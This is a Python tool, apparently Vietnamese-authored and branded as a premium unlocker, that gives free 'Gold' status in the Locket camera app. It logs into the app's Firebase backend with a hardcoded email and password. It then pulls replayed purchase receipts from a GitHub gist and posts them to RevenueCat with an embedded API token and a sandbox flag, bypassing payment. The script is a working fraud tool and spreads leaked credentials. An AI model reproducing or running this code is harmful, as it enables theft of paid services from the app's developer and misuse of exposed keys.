import json
import requests
import time
import random
import os
import webbrowser
from datetime import datetime
from colorama import Fore, Back, Style, init

# Khởi tạo colorama
init(autoreset=True)

# --- CẤU HÌNH DỮ LIỆU ---
CONFIG = {
    "EMAIL": "quangnamtricker@gmail.com",
    "PASSWORD": "quangnam123",
    "GIST_URL": "https://gist.githubusercontent.com/maihuybao/63e7edf5d680007ea306bcef7dd5dba0/raw/65d30cdfb31db3c39663d8c1dc05ba376e4bd557/token.json",
    "FB_URL": "https://fb.com/tuquangnam07"
}

class LocketUnlockerPro:
    def __init__(self):
        self.email = CONFIG["EMAIL"]
        self.password = CONFIG["PASSWORD"]
        self.gist_url = CONFIG["GIST_URL"]
        self.token = None
        self.headers = {
            "Accept": "*/*",
            "Content-Type": "application/json",
            "X-Ios-Bundle-Identifier": "com.locket.Locket",
            "User-Agent": "FirebaseAuth.iOS/10.23.1 com.locket.Locket/1.82.0 iPhone/18.0 hw/iPhone12_1"
        }

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_banner(self):
        self.clear_screen()
        banner = f"""
{Fore.CYAN}{Style.BRIGHT}╔══════════════════════════════════════════════════════════════════════╗
{Fore.YELLOW}  _      ____   _____ _  ________ _______    _____  ____  _      _____  
{Fore.YELLOW} | |    / __ \ / ____| |/ /  ____|__   __|  / ____|/ __ \| |    |  __ \ 
{Fore.YELLOW} | |   | |  | | |    | ' /| |__     | |    | |  __| |  | | |    | |  | |
{Fore.YELLOW} | |   | |  | | |    |  < |  __|    | |    | | |_ | |  | | |    | |  | |
{Fore.YELLOW} | |___| |__| | |____| . \| |____   | |    | |__| | |__| | |____| |__| |
{Fore.YELLOW} |______\____/ \_____|_|\_\______|  |_|     \_____|\____/|______|_____/ 
                                                                        
{Fore.GREEN}             🚀 PREMIUM UNLOCKER TOOL - LUXURY EDITION V1.0
{Fore.MAGENTA}                 Developed & Maintained by tuquangnam07
{Fore.CYAN}╚══════════════════════════════════════════════════════════════════════╝
        """
        print(banner)
        now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        print(f"{Fore.WHITE} [ {Fore.GREEN}SYSTEM OK {Fore.WHITE}] {Fore.YELLOW}Time: {now} | {Fore.YELLOW}User: Admin")
        print(Fore.CYAN + "═" * 72 + "\n")

    def loading_effect(self, duration=2, text="Processing"):
        chars = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
        end_time = time.time() + duration
        i = 0
        while time.time() < end_time:
            print(f"\r{Fore.YELLOW} [⏳] {text}... {chars[i % len(chars)]}", end="")
            time.sleep(0.1)
            i += 1
        print(f"\r{Fore.GREEN} [✔] {text} Complete!      ")

    def login(self):
        print(f"{Fore.WHITE}[{Fore.BLUE}ℹ{Fore.WHITE}] Đang xác thực tài khoản Firebase...")
        url = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyCQngaaXQIfJaH0aS2l7REgIjD7nL431So"
        payload = {
            "email": self.email,
            "password": self.password,
            "returnSecureToken": True
        }
        
        try:
            response = requests.post(url, json=payload, headers=self.headers)
            if response.ok:
                self.token = response.json().get('idToken')
                self.headers["Authorization"] = f"Bearer {self.token}"
                print(f"{Fore.GREEN}[+] Access Granted! Quyền truy cập cấp cao đã kích hoạt.")
                return True
            else:
                print(f"{Fore.RED}[-] Authentication Failed. Kiểm tra email/pass trong config.")
                return False
        except Exception as e:
            print(f"{Fore.RED}[!] Network Error: {e}")
            return False

    def get_uid_by_username(self, username):
        print(f"{Fore.WHITE}[{Fore.BLUE}ℹ{Fore.WHITE}] Đang truy vấn database: {Fore.CYAN}@{username}")
        self.loading_effect(1.5, "Querying User Data")
        
        url = "https://api.locketcamera.com/getUserByUsername"
        payload = {"data": {"username": username}}
        
        try:
            response = requests.post(url, json=payload, headers=self.headers)
            if response.ok:
                data = response.json().get("result", {}).get("data", {})
                uid = data.get("uid")
                if uid:
                    print(f"{Fore.GREEN}[+] UID Recognized: {Fore.WHITE}{uid}")
                    return uid
            print(f"{Fore.RED}[-] Không tìm thấy user. Vui lòng kiểm tra lại chính xác username.")
            return None
        except:
            return None

    def unlock_gold(self, target_uid):
        print(f"{Fore.WHITE}[{Fore.BLUE}ℹ{Fore.WHITE}] Đang inject payload Restore Purchase...")
        self.loading_effect(2, "Bypassing RevenueCat")
        
        try:
            res_gist = requests.get(self.gist_url)
            tokens = res_gist.json()
            payload_data = random.choice(tokens)
        except Exception as e:
            print(f"{Fore.RED}[-] Lỗi kết nối Server Payload: {e}")
            return False

        payload_data["app_user_id"] = target_uid
        if "attributes" in payload_data and "$attConsentStatus" in payload_data["attributes"]:
            payload_data["attributes"]["$attConsentStatus"]["updated_at_ms"] = int(time.time() * 1000)

        url = "https://api.revenuecat.com/v1/receipts"
        rv_headers = {
            "Authorization": "Bearer appl_JngFETzdodyLmCREOlwTUtXdQik",
            "Content-Type": "application/json",
            "X-Is-Sandbox": "true"
        }

        response = requests.post(url, headers=rv_headers, json=payload_data)
        if response.ok:
            print(f"\n{Back.GREEN}{Fore.BLACK}   SUCCESSFUL UNLOCK   {Style.RESET_ALL}")
            print(f"{Fore.GREEN}✨ Account {Fore.CYAN}{target_uid}{Fore.GREEN} has been UPGRADED to Gold.")
            print(f"{Fore.YELLOW}👉 Restart ứng dụng Locket để áp dụng thay đổi.")
            
            # Tự động mở Facebook sau khi thành công
            print(f"\n{Fore.MAGENTA}[!] Đang kết nối tới Profile của Admin...")
            time.sleep(2)
            webbrowser.open(CONFIG["FB_URL"])
            return True
        else:
            print(f"{Fore.RED}[-] Unlock Failed: {response.text}")
            return False

# --- KHỞI CHẠY ---
if __name__ == "__main__":
    tool = LocketUnlockerPro()
    tool.print_banner()
    
    if tool.login():
        print(Fore.CYAN + "═" * 72)
        target = input(f"{Fore.WHITE}👉 Nhập Username Locket cần mở khóa: {Fore.YELLOW}").strip()
        print(Fore.CYAN + "═" * 72)
        
        if target:
            uid = tool.get_uid_by_username(target)
            if uid:
                tool.unlock_gold(uid)
        else:
            print(f"{Fore.RED}[!] Username không được để trống.")
    
    # Sửa lỗi hiển thị hàng dọc ở đây
    print("\n" + Fore.CYAN + "═" * 72)
    print(f"{Fore.MAGENTA}      THANKS FOR USING | POWERED BY TUQUANGNAM07")
    print(Fore.CYAN + "═" * 72)
    print(f"{Fore.GREEN}✨ Khi kích hoạt thành công thì bạn cần phải cài đặt mobileconfig (cấu hình) để chặn thu hồi.")
    print(f"{Fore.GREEN}✨ Công cụ này được phát triển với mục đích học tập và nghiên cứu bảo mật.")
    print(f"{Fore.YELLOW}✨ Nếu bạn gặp lỗi hoặc cần hỗ trợ, hãy liên hệ qua Facebook: {Fore.CYAN}{CONFIG['FB_URL']}")
    input(f"{Fore.WHITE}\nNhấn Enter để đóng tool...")
